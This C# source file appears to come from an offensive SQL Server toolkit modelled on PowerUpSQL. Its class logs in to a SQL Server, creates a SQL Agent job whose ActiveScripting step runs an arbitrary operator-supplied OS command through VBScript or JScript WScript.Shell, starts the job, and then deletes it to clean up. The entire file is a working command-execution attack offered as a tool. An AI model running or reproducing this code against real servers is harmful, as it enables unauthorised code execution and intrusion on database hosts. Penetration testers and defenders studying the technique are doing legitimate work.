using System;
using System.Data;
using System.Linq;
using System.Text;

namespace DAFT.Modules
{
    sealed class SQLOSCmdAgentJob : SQLAgentJob
    {
        private const string QUERY1_2 = @"
@flags = 0,
@retry_attempts = 1,
@retry_interval = 5

EXECUTE dbo.sp_add_jobserver
@job_name = N'powerupsql_job'
EXECUTE dbo.sp_start_job N'powerupsql_job'";

        private const string QUERY2_1 = @"use msdb; EXECUTE sp_help_job @job_name = N'powerupsql_job'";

        private const string QUERY3_1 = @"USE msdb; EXECUTE sp_delete_job @job_name = N'powerupsql_job';";

        private string subsystem = string.Empty;

        internal SQLOSCmdAgentJob(Credentials credentials) : base(credentials)
        {

        }

        internal void SetSubSystem(string subsystem)
        {
            if (subsystem.ToLower() == "vbscript" || subsystem.ToLower() == "jscript")
                this.subsystem = subsystem;
        }

        internal void Query(string query)
        {
            using (SQLConnection sql = new SQLConnection(instance))
            {
                sql.BuildConnectionString(credentials);
                if (!sql.Connect())
                    return;

                if (!_Check(sql))
                    return;

                string command = string.Empty;
                string dbSubSystem = string.Empty;

                query = query.Replace("\'", "\'\'");

                string command_j = string.Format(
                    "function RunCmd()\n" +
                    "{\n" +
                    "var WshShell = new ActiveXObject(\"WScript.Shell\");\n" +
                    "var oExec = WshShell.Exec(\"{0}\");\n" +
                    "oExec = null;\n" +
                    "WshShell = null;\n" +
                    "}\n" +
                    "RunCmd();",
                    query
                    );

                string command_a = string.Format(
                    "Function Main()\n" +
                    "dim shell\n" +
                    "set shell = CreateObject(\"WScript.Shell\")\n" +
                    "shell.run(\"{0}\")\n" +
                    "set shell = nothing\n" + 
                    "END Function",
                    query
                    );

                if (subsystem.ToLower() == "vbscript")
                {
                    command = command_a;
                    dbSubSystem = "N\'VBScript\',";
                }
                else if (subsystem.ToLower() == "jscript")
                {
                    command = command_j;
                    dbSubSystem = "N\'JavaScript\',";
                }
                else
                {
                    return;
                }

                string query1_1 = string.Format(
                    "USE msdb;\n" +
                    "EXECUTE dbo.sp_add_job\n" +
                    "@job_name = N\'powerupsql_job\'\n" +

                    "EXECUTE sp_add_jobstep\n" +
                    "@job_name = N\'powerupsql_job\',\n" +
                    "@step_name = N\'powerupsql_job_step\',\n" +
                    "@subsystem = N'ActiveScripting',\n" +
                    "@command = N\'{1}\',\n",
                    subsystem, command
                );

                

                StringBuilder sb = new StringBuilder();
                sb.Append(query1_1);
                sb.Append(dbSubSystem);
                sb.Append(QUERY1_2);
#if DEBUG
                Console.WriteLine(sb.ToString());
#endif
                Console.WriteLine((string)_Query(sql, sb.ToString(), "output"));

                sb.Clear();
                sb.Append(QUERY2_1);
#if DEBUG
                Console.WriteLine(sb.ToString());
#endif
                Console.WriteLine(App.DELIMITER);
                Console.WriteLine((string)_Query(sql, sb.ToString(), "output"));
                Console.WriteLine(App.DELIMITER);

                sb.Clear();
                sb.Append(QUERY3_1);
#if DEBUG
                Console.WriteLine(sb.ToString());
#endif
                Console.WriteLine((string)_Query(sql, sb.ToString(), "output"));
            }
        }

        private static object _Query(SQLConnection sql, string query, string value)
        {
            DataTable table = sql.Query(query);
            try
            {
                foreach (DataRow row in table.AsEnumerable())
                    if (!string.IsNullOrEmpty(value))
                        return row[value];
            }
            catch (Exception ex)
            {
                if (ex is ArgumentNullException)
                    Console.WriteLine("Empty Response");
                else
                    Console.WriteLine(ex.Message);
            }
            return string.Empty;
        }
    }
}
